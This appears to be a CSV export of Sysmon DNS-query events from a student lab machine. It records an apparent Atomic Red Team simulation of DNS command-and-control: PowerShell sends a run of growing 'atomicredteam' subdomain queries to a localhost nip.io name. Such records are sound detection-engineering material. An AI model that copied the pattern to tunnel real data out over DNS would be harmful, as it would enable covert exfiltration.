"2025-12-26 11:30:06.720 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175377,"Query: 184.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicr.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:06.536","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:06.720 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175378,"Query: 185.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicre.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:06.575","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:06.720 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175379,"Query: 186.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicred.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:06.613","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:06.720 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175380,"Query: 187.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredt.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:06.651","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:07.732 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175381,"Query: 188.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredte.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:06.688","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:07.732 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175382,"Query: 189.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredtea.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:07.010","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:07.733 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175383,"Query: 190.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteam.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:07.334","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:07.733 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175384,"Query: 191.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteama.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:07.368","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:07.733 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175385,"Query: 192.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamat.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:07.400","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:07.733 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175386,"Query: 193.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamato.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:07.434","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:07.733 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175387,"Query: 194.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatom.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:07.473","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:07.733 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175388,"Query: 195.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomi.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:07.507","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:07.733 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175389,"Query: 196.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomic.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:07.541","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:07.733 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175390,"Query: 197.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicr.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:07.560","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:07.733 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175391,"Query: 198.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicre.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:07.580","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:07.733 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175392,"Query: 199.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicred.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:07.599","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:07.733 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175393,"Query: 200.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredt.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:07.632","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:07.733 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175394,"Query: 201.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredte.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:07.666","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:08.265 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175395,"Query: 202.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredtea.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:07.700","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:08.358 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175396,"Query: 203.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteam.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:07.734","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:08.358 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175397,"Query: 204.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteama.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:07.753","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:08.358 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175398,"Query: 205.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamat.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:07.773","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:08.358 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175399,"Query: 206.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamato.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:07.792","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:08.358 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175400,"Query: 207.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatom.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:07.813","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:08.358 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175401,"Query: 208.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomi.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:07.847","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:08.358 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175402,"Query: 209.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomic.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:07.866","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:08.358 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175403,"Query: 210.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicr.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:07.886","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:08.358 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175404,"Query: 211.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicre.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:07.906","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:08.358 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175405,"Query: 212.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicred.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:07.937","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:08.358 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175406,"Query: 213.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredt.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:07.957","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:08.358 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175407,"Query: 214.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:07.990","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:08.358 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175408,"Query: 215.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.at.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:08.010","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:08.358 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175409,"Query: 216.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.ato.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:08.030","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:08.358 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175410,"Query: 217.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atom.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:08.215","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:08.358 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175411,"Query: 218.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomi.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:08.238","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:08.358 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175412,"Query: 219.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomic.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:08.264","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:08.749 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175413,"Query: 220.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicr.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:08.285","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:30:08.749 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175414,"Query: 221.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicre.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:30:08.305","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
